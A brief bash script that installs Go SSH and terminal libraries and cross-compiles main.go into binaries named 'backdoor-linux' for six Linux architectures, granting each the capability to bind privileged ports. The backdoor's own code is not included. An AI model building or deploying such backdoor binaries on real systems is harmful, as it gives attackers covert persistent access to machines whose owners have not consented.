#!/usr/bin/bash
go get -u "github.com/gliderlabs/ssh"
go get -u "golang.org/x/crypto/ssh"
go get -u "golang.org/x/crypto/ssh/terminal"
go get -u "github.com/integrii/flaggy"
go get -u "github.com/creack/pty"

archs=(amd64 arm64 386 ppc64le ppc64 s390x)

for arch in ${archs[@]}
do
        env GOOS=linux GOARCH=${arch} go build -o backdoor-linux${arch} main.go
        setcap 'cap_net_bind_service=+ep' backdoor-linux${arch}
done